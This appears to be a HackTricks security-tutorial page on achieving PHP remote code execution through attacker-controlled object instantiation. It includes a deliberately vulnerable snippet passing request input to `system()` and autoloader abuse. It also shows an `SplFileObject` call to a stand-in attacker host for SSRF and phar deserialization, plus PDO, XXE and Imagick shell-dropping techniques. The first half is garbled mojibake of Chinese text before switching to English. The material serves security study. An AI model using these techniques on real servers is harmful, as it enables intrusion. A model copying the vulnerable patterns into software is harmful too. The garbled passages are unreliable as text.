# PHP - åˆ©ç”¨å¯¹è±¡åˆ›å»ºå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼:

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[NFTsæ”¶è—](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

è¿™åŸºæœ¬ä¸Šæ˜¯[https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)çš„æ‘˜è¦

## ä»‹ç»

åˆ›å»ºæ–°çš„ä»»æ„å¯¹è±¡ï¼Œä¾‹å¦‚`new $_GET["a"]($_GET["a"])`ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ï¼Œè¯¦ç»†ä¿¡æ¯è¯·å‚é˜…[**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ã€‚æœ¬æ–‡çªå‡ºäº†å®ç°RCEçš„å„ç§ç­–ç•¥ã€‚

## é€šè¿‡è‡ªå®šä¹‰ç±»æˆ–è‡ªåŠ¨åŠ è½½å®ç°RCE

è¯­æ³•`new $a($b)`ç”¨äºå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­**`$a`**è¡¨ç¤ºç±»åï¼Œ**`$b`**æ˜¯ä¼ é€’ç»™æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚è¿™äº›å˜é‡å¯ä»¥æ¥è‡ªç”¨æˆ·è¾“å…¥ï¼Œå¦‚GET/POSTï¼Œå…¶ä¸­å®ƒä»¬å¯èƒ½æ˜¯å­—ç¬¦ä¸²æˆ–æ•°ç»„ï¼Œæˆ–æ¥è‡ªJSONï¼Œå…¶ä¸­å®ƒä»¬å¯èƒ½å‘ˆç°ä¸ºå…¶ä»–ç±»å‹ã€‚

è€ƒè™‘ä¸‹é¢çš„ä»£ç ç‰‡æ®µ:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†`$a`è®¾ç½®ä¸º`App`æˆ–`App2`ï¼Œå°†`$b`è®¾ç½®ä¸ºç³»ç»Ÿå‘½ä»¤ï¼ˆä¾‹å¦‚`uname -a`ï¼‰ä¼šå¯¼è‡´è¯¥å‘½ä»¤è¢«æ‰§è¡Œã€‚

**è‡ªåŠ¨åŠ è½½å‡½æ•°**å¯èƒ½ä¼šè¢«åˆ©ç”¨ï¼Œå¦‚æœæ²¡æœ‰ç›´æ¥å¯è®¿é—®çš„ç±»ã€‚è¿™äº›å‡½æ•°ä¼šåœ¨éœ€è¦æ—¶è‡ªåŠ¨ä»æ–‡ä»¶ä¸­åŠ è½½ç±»ï¼Œå¹¶ä½¿ç”¨`spl_autoload_register`æˆ–`__autoload`æ¥å®šä¹‰ï¼š
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
## é€šè¿‡å¯¹è±¡åˆ›å»ºæ»¥ç”¨å®ç° RCE

åœ¨ PHP ç‰ˆæœ¬ä¸­ï¼Œè‡ªåŠ¨åŠ è½½çš„è¡Œä¸ºå„ä¸ç›¸åŒï¼Œæä¾›äº†ä¸åŒçš„ RCE å¯èƒ½æ€§ã€‚

### é€šè¿‡å†…ç½®ç±»å®ç° RCE

åœ¨ç¼ºä¹è‡ªå®šä¹‰ç±»æˆ–è‡ªåŠ¨åŠ è½½ç¨‹åºçš„æƒ…å†µä¸‹ï¼Œ**å†…ç½®çš„ PHP ç±»**å¯èƒ½è¶³ä»¥å®ç° RCEã€‚è¿™äº›ç±»çš„æ•°é‡åœ¨ 100 åˆ° 200 ä¹‹é—´ï¼Œå–å†³äº PHP ç‰ˆæœ¬å’Œæ‰©å±•ã€‚å¯ä»¥ä½¿ç”¨ `get_declared_classes()` åˆ—å‡ºè¿™äº›ç±»ã€‚

å¯ä»¥é€šè¿‡åå°„ API æ¥è¯†åˆ«æ„Ÿå…´è¶£çš„æ„é€ å‡½æ•°ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤ºå’Œé“¾æ¥ [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)ã€‚

**é€šè¿‡ç‰¹å®šæ–¹æ³•å®ç° RCE åŒ…æ‹¬ï¼š**

### **SSRF + Phar ååºåˆ—åŒ–**

`SplFileObject` ç±»é€šè¿‡å…¶æ„é€ å‡½æ•°å®ç° SSRFï¼Œå…è®¸è¿æ¥åˆ°ä»»ä½• URLï¼š
```php
new SplFileObject('http://attacker.com/');
```
### **åˆ©ç”¨PDOs**

PDOç±»æ„é€ å‡½æ•°å…è®¸é€šè¿‡DSNå­—ç¬¦ä¸²è¿æ¥åˆ°æ•°æ®åº“ï¼Œå¯èƒ½ä¼šå¯ç”¨æ–‡ä»¶åˆ›å»ºæˆ–å…¶ä»–äº¤äº’ï¼š
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Versions of PHP up to 5.3.22 and 5.4.12 were susceptible to XXE attacks through the `SoapClient` and `SimpleXMLElement` constructors, contingent on the version of libxml2.

## RCE via Imagick Extension

In the analysis of a **project's dependencies**, it was discovered that **Imagick** could be leveraged for **command execution** by instantiating new objects. This presents an opportunity for exploiting vulnerabilities.

### VID parser

The VID parser capability of writing content to any specified path in the filesystem was identified. This could lead to the placement of a PHP shell in a web-accessible directory, achieving Remote Code Execution (RCE).

#### VID Parser + File Upload

It's noted that PHP temporarily stores uploaded files in `/tmp/phpXXXXXX`. The VID parser in Imagick, utilizing the **msl** protocol, can handle wildcards in file paths, facilitating the transfer of the temporary file to a chosen location. This method offers an additional approach to achieve arbitrary file writing within the filesystem.

### PHP Crash + Brute Force

A method described in the [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) involves uploading files that trigger a server crash before deletion. By brute-forcing the name of the temporary file, it becomes possible for Imagick to execute arbitrary PHP code. However, this technique was found to be effective only in an outdated version of ImageMagick.

## References

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
